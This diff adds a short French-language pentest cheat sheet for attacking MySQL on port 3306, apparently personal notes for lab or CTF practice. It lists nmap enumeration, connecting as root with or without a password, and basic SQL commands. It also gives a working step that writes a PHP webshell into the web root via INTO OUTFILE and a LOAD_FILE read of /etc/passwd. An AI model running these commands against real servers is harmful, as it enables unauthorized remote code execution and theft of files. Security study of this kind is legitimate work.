@@ -1,0 +1,54 @@
+---
+public: true 
+#Tags: tag1, tag2
+---
+
+Port : 3306
+
+## Enumeration
+```shell-session
+sudo nmap $TARGET_IP -sV -sC -p3306 --script mysql*
+```
+
+## Connexion
+```
+# Connexion en tant qu'utilisateur 'root'
+
+#    - Sans mot de passe
+mysql -h $TARGET_IP -u root 
+
+#    - Avec mot de passe
+mysql -h $TARGET_IP -u root  -pLeMotDePasseSansEspace
+```
+
+## Commandes utiles
+
+```Mysql
+select version();
+
+show databases;
+
+use <database>;
+
+show tables;
+show columns from <table>;
+select * from <table> where <column> = "<texte>";
+select * from <table> where <column> like "<debut du texte>%";
+
+
+-- Consultation de la valeur de secure_file_priv
+-- selon sa valeur, l'écrite dans un fichier via INTO OUTFILE sera possible ou non
+-- si VIDE : on peut l'utiliser. si pointe vers un dossier, seul ce dossier est autorisé en export. Si NULL : désactivé
+ show variables like "secure_file_priv";
+-- Ecriture d'un webshell 
+mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+
+## Exploitation
+
+### Lecture d'un fichier
+
+```
+-- Ne fonctionne pas sur une in stallation par défaut
+select LOAD_FILE("/etc/passwd");
+```
